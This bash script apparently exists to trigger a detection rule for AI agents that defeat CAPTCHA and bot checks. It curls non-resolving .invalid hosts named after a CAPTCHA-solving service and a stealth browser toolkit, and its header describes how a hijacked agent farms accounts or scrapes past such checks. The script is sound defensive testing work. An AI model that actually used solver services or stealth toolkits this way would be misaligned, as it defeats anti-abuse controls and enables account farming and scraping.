#!/usr/bin/env bash
# antiautomation.sh - benign emulation of an agent defeating an anti-automation (CAPTCHA/bot) control.
#
# What an attacker does: drive a hijacked AI agent to beat the automation checks that separate humans
# from bots - hand the CAPTCHA to a solving service (2captcha/CapSolver/anti-captcha), or drive a
# browser with an anti-bot-detection "stealth" toolkit - so it can farm accounts or scrape behind a
# challenge. This does the harmless analogue: it curls a solver-service name and a stealth-toolkit
# name under .invalid (RFC 6761: never resolves, so nothing leaves and curl fails fast). The
# solver/toolkit name in the argv is the signal; no CAPTCHA is solved and no browser is driven.
# Deliberately does NOT use ImageMagick (T1696.001's homegrown example) - that is benign and the rule
# does not key on it. Fires only when run as an AGENT account (User in claude/redteam/lab); proven by
# the engine golden/replay tests, since the VM runs as alice. See ./README.md.
#
# Imitates: rules/agent/agent_anti_automation_evasion.yml - ATT&CK T1696 / T1696.001 (v20)
# Expected rules: agent_anti_automation_evasion
set -u

# --- TTP: call a CAPTCHA-solving service -> agent_anti_automation_evasion (solver_service) ---
# 2captcha.invalid never resolves (RFC 6761): the request fails fast; nothing is sent.
if command -v curl >/dev/null 2>&1; then
	curl -s --max-time 2 "http://2captcha.invalid/in.php?key=DUMMY&method=base64" >/dev/null 2>&1 || true
fi

# --- TTP: pull in an anti-bot "stealth" automation toolkit -> agent_anti_automation_evasion (stealth_toolkit) ---
# The package name is the signal; the .invalid host never resolves so nothing is fetched.
if command -v curl >/dev/null 2>&1; then
	curl -s --max-time 2 "http://pkg.invalid/undetected-chromedriver.tar.gz" >/dev/null 2>&1 || true
fi

exit 0
